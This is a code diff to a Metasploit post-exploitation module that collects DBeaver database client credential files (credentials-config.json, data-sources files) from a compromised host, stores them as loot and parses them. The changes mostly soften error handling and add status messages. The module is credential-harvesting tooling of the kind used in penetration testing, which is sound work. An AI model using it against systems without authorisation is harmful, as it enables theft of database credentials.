@@ -33,12 +33,6 @@ class MetasploitModule < Msf::Post
           'Stability' => [],
           'Reliability' => [],
           'SideEffects' => []
-        },
-        'Compat' => {
-          'Meterpreter' => {
-            'Commands' => %w[
-            ]
-          }
         }
       )
     )
@@ -85,7 +79,7 @@ class MetasploitModule < Msf::Post
       if file_exist?(credentials_config) && file_exist?(data_sources)
         credentials_config_data = read_file(credentials_config) || ''
         data_sources_data = read_file(data_sources) || ''
-        fail_with(Failure::Unknown, 'The file could not be read') if data_sources_data.empty? || credentials_config_data.empty?
+        print_error('The file could not be read') if data_sources_data.empty? || credentials_config_data.empty?
         credentials_config_loot_path = store_loot('dbeaver.creds', 'text/json', session, credentials_config_data, credentials_config)
         data_sources_loot_path = store_loot('dbeaver.creds', 'text/json', session, data_sources_data, data_sources)
         print_good("dbeaver credentials-config.json saved to #{credentials_config_loot_path}")
@@ -93,8 +87,8 @@ class MetasploitModule < Msf::Post
         some_result << parse_data_sources(data_sources_data, credentials_config_data)
         print_status("Finished processing #{json_dir}")
       end
-    rescue Rex::Post::Meterpreter::RequestError
-      fail_with(Failure::Unknown, "The file #{json_dir} either could not be read or does not exist")
+    rescue ::JSON::ParserError
+      print_error("The file #{json_dir} either could not be read or does not exist")
     end
     return some_result
   end
@@ -104,14 +98,17 @@ class MetasploitModule < Msf::Post
     begin
       if file_exist?(fullpath)
         file_data = read_file(fullpath) || ''
-        fail_with(Failure::Unknown, "The file #{fullpath} could not be read") if file_data.empty?
+        print_error("The file #{fullpath} could not be read") if file_data.empty?
         loot_path = store_loot('dbeaver.creds', 'text/xml', session, file_data, fullpath)
         print_good("dbeaver .dbeaver-data-sources.xml saved to #{loot_path}")
-        some_result << parse_data_sources_xml(file_data)
+        result = parse_data_sources_xml(file_data)
+        if !result.empty?
+          some_result << result
+        end
         print_status("Finished processing #{fullpath}")
       end
     rescue Rex::Post::Meterpreter::RequestError
-      fail_with(Failure::Unknown, "The file #{fullpath} either could not be read or does not exist")
+      print_error("The file #{fullpath} either could not be read or does not exist")
     end
     return some_result
   end
@@ -128,6 +125,7 @@ class MetasploitModule < Msf::Post
     end
     if datastore['JSON_DIR_PATH'].present?
       json_path = datastore['JSON_DIR_PATH']
+      print_status("Looking for JSON files in #{json_path}")
       all_result += parse_json_dir(json_path)
     end
     if xml_path.empty? && json_path.empty?
